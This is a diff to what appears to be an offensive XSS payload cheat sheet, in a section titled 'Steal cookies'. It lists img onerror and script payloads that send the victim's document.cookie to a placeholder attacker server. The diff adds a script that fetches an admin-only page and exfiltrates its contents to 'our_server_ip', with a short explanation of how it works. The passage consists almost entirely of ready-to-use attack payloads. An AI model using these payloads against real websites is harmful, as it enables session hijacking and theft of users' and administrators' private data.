@@ -21,6 +21,20 @@ Steal cookies
 	<img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
 	"><img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
 	'><img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
+	<script>document.location='http://<YOUR_SERVER_IP>/?cookie='+document.cookie;</script>
+
+If there is no cookie, e can also try to access pages the only the admin can have access, by doing:
+
+	<script>
+	fetch("http://page_that_only_admin_has_access_to")
+	.then(response => response.text()) // Convert the response to text
+	.then(data => {
+		fetch("http://our_server_ip/?data=" + encodeURIComponent(data)); // Exfiltrate data
+	})
+	.catch(error => console.error("Error fetching the messages:", error));
+	</script>
+
+This fetches the page that onyl the admin has access to, converts it to text, uri encodes it, and then sends the data back to us.
 
 ## php payloads
 
